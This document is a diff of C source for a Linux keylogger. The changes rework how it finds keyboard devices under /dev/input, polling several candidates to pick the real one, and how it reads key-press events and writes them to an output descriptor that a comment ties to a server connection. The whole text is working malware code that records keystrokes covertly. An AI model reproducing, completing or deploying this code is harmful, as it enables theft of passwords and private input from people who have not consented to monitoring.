@@ -14,15 +14,20 @@
 #include <netinet/in.h>
 #include <sys/stat.h>
 #include <dirent.h>
+#include <poll.h>
 #include "keylogger.h"
 
 int STOP_KEYLOGGER = 0;
 
-void startKeylogger(int keyboard, int fd)
+void sigHandler(int signum)
 {
-    ssize_t to_write;
+    STOP_KEYLOGGER = 1;
+}
+
+void startKeylogger(int keyboard, int fd_out)
+{
     size_t event_size = sizeof(event);
-    event *kbd_events;
+    event *kbd_events = malloc(event_size * MAX_EVENTS);
     struct sigaction sa;
 
     sa.sa_flags = 0;
@@ -34,31 +39,26 @@ void startKeylogger(int keyboard, int fd)
 
     while (!STOP_KEYLOGGER) /* If server closed connection and write failed (SIGPIPE), user sent SIGTERM or another IO error occurred we stop keylogging */
     {
-        to_write = read(keyboard, kbd_events, event_size * MAX_EVENTS);
-        if (to_write < 0) /* If read was interrupted by SIGTERM or another error occurred we stop keylogging */
+        ssize_t r = read(keyboard, kbd_events, event_size * MAX_EVENTS);
+        if (r < 0) /* If read was interrupted by SIGTERM or another error occurred we stop keylogging */
             goto end;
         else
         {
             size_t j = 0;
-            for (size_t i = 0; i < to_write / event_size; i++) /* For each event read */
+            for (size_t i = 0; i < r / event_size; i++) /* For each event read */
             {
                 if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) /* If a key has been pressed.. */
                     kbd_events[j++] = kbd_events[i];                                    /*  Add the event to the beginning of the array */
             }
-            if (!writeEventsIntoFile(fd, kbd_events, j * event_size))
+            if (!writeEventsIntoFile(fd_out, kbd_events, j * event_size))
                 goto end;
         }
     }
 end:
-    close(fd);
+    close(fd_out);
     close(keyboard);
     free(kbd_events);
     return;
-}
-
-void sigHandler(int signum)
-{
-    STOP_KEYLOGGER = 1;
 }
 
 int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)
@@ -75,89 +75,104 @@ int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)
     return 1;
 }
 
-int findKeyboardDevice(char *dir_path)
+int *findKeyboards(char *path, int *num_keyboards)
 {
+    DIR *dir = opendir(path);
+    if (dir == NULL)
+    {
+        perror("Unable to open directory");
+        *num_keyboards = 0;
+        return NULL;
+    }
 
     struct dirent *file;
-    DIR *dir;
-    struct stat file_info;
-    char *file_path;
+    int max_keyboards = 2;
+    int *keyboards = malloc(max_keyboards * sizeof(int));
+    int num_found = 0;
 
-    if ((dir = opendir(dir_path)) < 0)
-        return -1;
-
-    while ((file = readdir(dir)) != NULL) /* We need to check every file of the directory */
+    while ((file = readdir(dir)) != NULL)
     {
-
-        if (!strcmp(file->d_name, ".") || !strcmp(file->d_name, "..")) /* We skip . and .. directories */
-            continue;
-
-        file_path = malloc(strlen(file->d_name) + strlen(dir_path) + 1);
-        strcpy(file_path, dir_path);
-        strcat(file_path, file->d_name); /* Concatenating dir path to current file name */
-
-        struct stat file_info;
-
-        if (lstat(file_path, &file_info) < 0) /* Getting current file info */
-            continue;                         /* Skip to the next file of the directory */
-
-        if (!S_ISDIR(file_info.st_mode)) /* If current file is not a directory.. */
+        if (strncmp(file->d_name, "event", 5) == 0)
         {
-            if (S_ISCHR(file_info.st_mode)) /* .. if it is a character device .. */
+            char file_path[267];
+            snprintf(file_path, sizeof(file_path), "/dev/input/%s", file->d_name);
+
+            int fd = open(file_path, O_RDONLY);
+            if (fd > -1 && isKeyboardDevice(fd))
             {
-                int keyboard_fd;
-                if (isKeyboardDevice(file_path, &keyboard_fd)) /* .. and it is a keyboard device, we return its file descriptor */
+                keyboards[num_found++] = fd;
+                if (num_found == max_keyboards)
                 {
-                    free(file_path);
-                    return keyboard_fd;
+                    max_keyboards *= 2;
+                    keyboards = realloc(keyboards, max_keyboards * sizeof(int));
+                }
+            }
+            else
+                close(fd);
+        }
+    }
+    closedir(dir);
+    *num_keyboards = num_found;
+    return keyboards;
+}
+
+int findRealKeyboard(int *keyboards, int num_keyboards, int timeout, int *keyboard)
+{
+
+    struct pollfd fds[num_keyboards];
+    size_t event_size = sizeof(event);
+    event *kbd_events = malloc(event_size * MAX_EVENTS);
+
+    if (keyboards == NULL || num_keyboards <= 0)
+        return 0;
+
+    for (int i = 0; i < num_keyboards; i++)
+    {
+        fds[i].events = POLLIN;
+        fds[i].fd = keyboards[i];
+    }
+
+    while (1)
+    {
+        int ready = poll(fds, num_keyboards, timeout);
+        if (ready < 0) // timeout seconds passed or poll failed, we assume keyboards were all false positives
+            return 0;
+        else
+        {
+            for (int i = 0; i < num_keyboards; i++)
+            {
+                if (fds[i].revents & POLLIN)
+                {
+                    ssize_t r;
+                    r = read(fds[i].fd, kbd_events, event_size * MAX_EVENTS);
+                    if (r < 0)
+                        return 0;
+
+                    for (size_t j = 0; j < r / event_size; j++)                                        /* For each event read */
+                        if (kbd_events[j].type == EV_KEY && kbd_events[j].value == KEY_PRESSED)        /* If a key has been pressed.. */
+                            if (kbd_events[j].code >= KEY_RESERVED && kbd_events[j].code <= KEY_WIMAX) /* And it is a key of a legit keyboard (not a key of a gaming mouse or a joypad, for example)*/
+                            {
+                                *keyboard = fds[i].fd;
+                                return 1;
+                            }
                 }
             }
         }
-        else /* If file is a directory.. */
-        {
-            char *path_with_slash = malloc(strlen(file_path) + 2);
-            strncpy(path_with_slash, file_path, strlen(file_path));
-            path_with_slash[strlen(file_path)] = '/'; /* Appending a slash to the path */
-            path_with_slash[strlen(file_path) + 1] = '\0';
-            int kbd_fd = findKeyboardDevice(path_with_slash); /* .. recursive call over this directory to check for its files */
-            if (kbd_fd >= 0) /* If terminated call found the keyboard device, we propagate it */
-            {
-                free(file_path);
-                free(path_with_slash);
-                return kbd_fd;
-            }
-        }
     }
-
-    free(file_path);
-    return -1;
+    return 0;
 }
 
-int isKeyboardDevice(char *path, int *keyboard_device)
+int isKeyboardDevice(int fd)
 {
     int32_t events_bitmask = 0;
     int32_t keys_bitmask = 0;
     int32_t keys = KEY_Q | KEY_A | KEY_Z | KEY_1 | KEY_9;
-    int fd;
-
-    fd = open(path, O_RDONLY);
-
-    if (fd < 0)
-        return 0;
 
     if (ioctl(fd, EVIOCGBIT(0, sizeof(events_bitmask)), &events_bitmask) >= 0) // Getting bit events supported by device
-    {
-        if ((events_bitmask & EV_KEY) == EV_KEY) // If EV_KEY bit is set then it could be a Keyboard, but it can be a false positive (for example, power button has this bit set but it is not a kbd)
-        {
+        if ((events_bitmask & EV_KEY) == EV_KEY)                               // If EV_KEY bit is set then it could be a Keyboard, but it can be a false positive (for example, power button has this bit set but it is not a kbd)
             if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keys_bitmask)), &keys_bitmask) >= 0)
                 if ((keys & keys_bitmask) == keys) // If it support those keys then good chances are that we just found the keyboard device
-                {
-                    *keyboard_device = fd;
-                    return 1;
-                }
-        }
-    }
-    close(fd);
+                    return (keys & keys_bitmask) == keys ? 1 : 0;
     return 0;
 }
 
